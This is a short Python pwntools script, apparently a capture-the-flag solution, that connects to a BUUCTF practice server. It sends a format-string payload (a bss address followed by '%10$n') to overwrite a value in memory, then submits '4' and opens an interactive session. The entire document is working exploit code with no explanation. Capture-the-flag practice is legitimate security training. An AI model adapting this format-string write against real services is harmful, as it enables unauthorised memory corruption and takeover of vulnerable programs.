from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29582)
bss_addr = 0x804C044
payload = p32(bss_addr) + b'%10$n'
io.sendline(payload)
io.sendline(b'4')
io.interactive()